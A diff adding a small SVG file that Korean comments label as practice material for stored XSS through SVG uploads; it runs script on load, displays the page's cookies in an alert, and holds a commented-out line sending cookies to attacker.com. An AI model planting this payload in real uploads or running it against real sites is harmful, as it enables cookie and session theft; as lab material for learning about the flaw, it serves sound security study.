@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- [실습용] SVG 파일을 이용한 Stored XSS -->
+<!-- 이미지 파일로 위장하지만 SVG는 XML 기반으로 스크립트 포함 가능 -->
+<!-- 서버가 .svg 업로드를 허용하고 그대로 렌더링할 경우 XSS 발생 -->
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG upload!')">
+  <rect width="200" height="100" fill="red"/>
+  <text x="10" y="50" fill="white">XSS Test</text>
+  <script type="text/javascript">
+    // 실제 공격 시나리오: 쿠키 탈취
+    // document.location='http://attacker.com/steal?c='+document.cookie;
+    alert('SVG XSS 취약점 실증: 쿠키=' + document.cookie);
+  </script>
+</svg>
